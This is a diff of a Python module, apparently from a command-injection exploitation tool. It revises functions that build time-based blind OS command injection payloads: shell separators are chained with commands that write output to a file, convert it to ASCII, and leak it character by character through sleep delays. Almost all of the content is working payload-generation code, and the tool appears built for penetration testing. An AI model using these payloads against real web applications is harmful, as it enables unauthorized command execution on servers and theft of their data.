@@ -71,7 +71,7 @@ def decision(separator, j, TAG, OUTPUT_TEXTFILE, delay, http_request_method):
   elif separator == "||" :
     payload = ("| " + 
               "echo " + TAG + " > " + OUTPUT_TEXTFILE + " | "+ 
-              "[ " + str(j) + " -ne $(cat \""+OUTPUT_TEXTFILE+"\" | tr -d '\\n' | wc -c) ] " + separator + " "
+              "[ " + str(j) + " -ne $(cat "+OUTPUT_TEXTFILE+" | tr -d '\\n' | wc -c) ] " + separator + " "
               "sleep " + str(delay) + " "
               )  
   else:
@@ -145,24 +145,34 @@ def decision_alter_shell(separator, j, TAG, OUTPUT_TEXTFILE, delay, http_request
 def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, delay, http_request_method):
   if separator == ";" :
     payload = (separator + " "
-              "str=$("+ cmd + " > " + OUTPUT_TEXTFILE + ")" + separator + " "
+              "str=$("+ cmd + " > " + OUTPUT_TEXTFILE + separator + " tr '\\n' ' ' < " + OUTPUT_TEXTFILE + " )" + separator +
+              "echo $str > " + OUTPUT_TEXTFILE + separator + 
               "str=$(cat " + OUTPUT_TEXTFILE + ")" + separator + " "
+              # Find the length of the output.
               "str1=${#str}" + separator + " "
               "if [ " + str(j) + " != ${str1} ]" + separator + " "
               "then sleep 0 " + separator + " "
-              "else sleep " + str(delay) + separator + " "
+              "else sleep " + str(delay) + separator +
+              # Transform to ASCII
+              "str1=$(od -A n -t d1 < "+OUTPUT_TEXTFILE +")"+ separator + 
+              "echo $str1 > " + OUTPUT_TEXTFILE + separator + 
               "fi "
               )
 
   elif separator == "%0a" :
     separator = "\n"
     payload = (separator + " "
-              "str=$("+ cmd + " > " + OUTPUT_TEXTFILE + ")" + separator + " "
+              "str=$("+ cmd + " > " + OUTPUT_TEXTFILE + separator + " tr '\\n' ' ' < " + OUTPUT_TEXTFILE + " )" + separator +
+              "echo $str > " + OUTPUT_TEXTFILE + separator + 
               "str=$(cat " + OUTPUT_TEXTFILE + ")" + separator + " "
+              # Find the length of the output.
               "str1=${#str}" + separator + " "
               "if [ " + str(j) + " != ${str1} ]" + separator + " "
               "then sleep 0 " + separator + " "
               "else sleep " + str(delay) + separator + " "
+              # Transform to ASCII
+              "str1=$(od -A n -t d1 < "+OUTPUT_TEXTFILE +")"+ separator + 
+              "echo $str1 > " + OUTPUT_TEXTFILE + separator + 
               "fi "
               )
 
@@ -174,12 +184,16 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, delay, http_request_method
       ampersand = "&"
     payload = (ampersand + " " +
               "sleep 0 " + separator + " "
-              "str=$("+cmd+" > " + OUTPUT_TEXTFILE +") " + separator + " "
+              "str=$("+ cmd + " > " + OUTPUT_TEXTFILE + separator + " tr '\\n' ' ' < " + OUTPUT_TEXTFILE + " )" + separator +
+              "echo $str > " + OUTPUT_TEXTFILE + separator + 
               "str=$(cat " + OUTPUT_TEXTFILE + ")" + separator + " "
               # Find the length of the output.
               "str1=${#str} " + separator + " "
               "[ " + str(j) + " -eq ${str1} ]" + separator + " "
-              "sleep " + str(delay) + " "
+              "sleep " + str(delay) + separator +  " "
+              # Transform to ASCII
+              "str1=$(od -A n -t d1 < "+OUTPUT_TEXTFILE +")"+ separator + 
+              "echo $str1 > " + OUTPUT_TEXTFILE 
               )
     if http_request_method == "POST":
       separator = urllib.unquote(separator)
@@ -187,7 +201,7 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, delay, http_request_method
   elif separator == "||" :                
     payload = ("| " + 
               "echo $(" + cmd + ") > " + OUTPUT_TEXTFILE + " | "+ 
-              "[ " + str(j) + " -ne $(cat \""+OUTPUT_TEXTFILE+"\" | tr -d '\\n' | wc -c) ] " + separator + " "
+              "[ " + str(j) + " -ne $(cat "+OUTPUT_TEXTFILE+" | tr -d '\\n' | wc -c) ] " + separator + " "
               "sleep " + str(delay) + " "
               )                     
   else:
@@ -260,9 +274,10 @@ def cmd_execution_alter_shell(separator, cmd, j, OUTPUT_TEXTFILE, delay, http_re
 #---------------------------------------------------
 def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, delay, http_request_method):
   if separator == ";" :
-    payload = (separator + " "
-              "str=$(cat " + OUTPUT_TEXTFILE + "|tr '\\n' ' '|cut -c " + str(num_of_chars) + "|od -N 1 -i|head -1|tr -s ' '|cut -d ' ' -f 2)" + separator +
-              "if [ " + str(ascii_char) + " != ${str} ]" + separator +
+    payload = (separator + " " +
+              # Use space as delimiter
+              "str=$(cut -d ' ' -f " + str(num_of_chars) + " < " + OUTPUT_TEXTFILE+ ")" + separator +
+              "if [ " +  str(ascii_char) + " != ${str} ]" + separator +
               "then sleep 0" + separator +
               "else sleep " + str(delay) + separator +
               "fi "
@@ -271,8 +286,9 @@ def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, delay, http_r
   elif separator == "%0a" :
     separator = "\n"
     payload = (separator + " "
-              "str=$(cat " + OUTPUT_TEXTFILE + "|tr '\\n' ' '|cut -c " + str(num_of_chars) + "|od -N 1 -i|head -1|tr -s ' '|cut -d ' ' -f 2)" + separator +
-              "if [ " + str(ascii_char) + " != ${str} ]" + separator +
+              # Use space as delimiter
+              "str=$(cut -d ' ' -f " + str(num_of_chars) + " < " + OUTPUT_TEXTFILE+ ")" + separator +
+              "if [ " +  str(ascii_char) + " != ${str} ]" + separator +
               "then sleep 0" + separator +
               "else sleep " + str(delay) + separator +
               "fi "
@@ -286,7 +302,8 @@ def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, delay, http_r
       ampersand = "&"
     payload = (ampersand + " " +
               "sleep 0 " +  separator + " "
-              "str=$(cat " + OUTPUT_TEXTFILE + "|tr '\\n' ' '|cut -c " + str(num_of_chars) + "|od -N 1 -i|head -1|tr -s ' '|cut -d ' ' -f 2) " + separator + " "
+              # Use space as delimiter
+              "str=$(cut -d ' ' -f " + str(num_of_chars) + " < " + OUTPUT_TEXTFILE+ ")" + separator +
               "[ " + str(ascii_char) + " -eq ${str} ] " +  separator + " "
               "sleep "+ str(delay) + " "
               )
@@ -361,8 +378,8 @@ def get_char_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, d
 def fp_result(separator, OUTPUT_TEXTFILE, ascii_char, delay, http_request_method):
   if separator == ";" :
     payload = (separator + " "
-              "str=$(cat " + OUTPUT_TEXTFILE + ")" + separator + " "
-              "if [ " + str(ascii_char) + " != ${str} ]" + separator + " "
+              "str=$(cut -c1-2 " + OUTPUT_TEXTFILE + ")" + separator + " "
+              "if [ " + str(ord(str(ascii_char))) + " != ${str} ]" + separator + " "
               "then sleep 0" + separator + " "
               "else sleep " + str(delay) + separator + " "
               "fi "
@@ -371,8 +388,8 @@ def fp_result(separator, OUTPUT_TEXTFILE, ascii_char, delay, http_request_method
   elif separator == "%0a" :
     separator = "\n"
     payload = (separator + " "
-              "str=$(cat " + OUTPUT_TEXTFILE + ")" + separator + " "
-              "if [ " + str(ascii_char) + " != ${str} ]" + separator + " "
+              "str=$(cut -c1-2 " + OUTPUT_TEXTFILE + ")" + separator + " "
+              "if [ " + str(ord(str(ascii_char))) + " != ${str} ]" + separator + " "
               "then sleep 0" + separator + " "
               "else sleep " + str(delay) + separator + " "
               "fi "
@@ -386,8 +403,8 @@ def fp_result(separator, OUTPUT_TEXTFILE, ascii_char, delay, http_request_method
       ampersand = "&"
     payload = (ampersand + " " +
               "sleep 0 " +  separator + " "
-              "str=$(cat " + OUTPUT_TEXTFILE + ") " + separator + " "
-              "[ " + str(ascii_char) + " -eq ${str} ] " +  separator + " "
+              "str=$(cut -c1-2 " + OUTPUT_TEXTFILE + ") " + separator + " "
+              "[ " + str(ord(str(ascii_char))) + " -eq ${str} ] " +  separator + " "
               "sleep "+ str(delay) + " "
               )
     if http_request_method == "POST":
@@ -454,3 +471,4 @@ def fp_result_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, 
     payload = payload.replace("\n",";")
 
   return payload
+# eof
